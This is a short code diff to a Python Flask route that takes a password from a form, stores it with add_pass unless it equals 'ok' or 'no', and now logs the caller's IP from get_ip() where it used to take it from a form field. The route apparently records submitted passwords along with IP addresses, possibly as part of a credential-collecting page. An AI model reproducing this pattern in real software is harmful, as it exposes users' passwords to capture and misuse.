@@ -38,7 +38,7 @@ def check_pass():
     if request.method == "POST":
         
         password = (request.form["pass"])
-        custom_ip = request.form["custom_ip"]
+        custom_ip = get_ip()
         location = "desktop"
         if password != "ok" and password != "no":
             add_pass(password)
